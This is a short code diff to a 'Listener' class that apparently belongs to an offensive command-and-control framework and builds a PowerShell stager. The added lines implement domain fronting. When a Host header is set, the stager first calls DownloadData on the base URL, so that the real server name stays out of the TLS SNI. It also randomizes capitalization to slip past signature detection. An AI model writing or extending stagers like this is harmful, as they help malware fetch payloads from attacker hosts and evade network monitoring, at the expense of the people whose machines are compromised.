@@ -257,6 +257,11 @@ class Listener:
                     for header in customHeaders:
                         headerKey = header.split(':')[0]
                         headerValue = header.split(':')[1]
+			#If host header defined, assume domain fronting is in use and add a call to the base URL first
+			#this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+			if headerKey.lower() == "host":
+			    stager += "$clr='%s';" % (host)
+			    stager += helpers.randomize_capitalization("$WC.DownloadData($clr);")
                         stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                         stager += "\"%s\",\"%s\");" % (headerKey, headerValue)
 
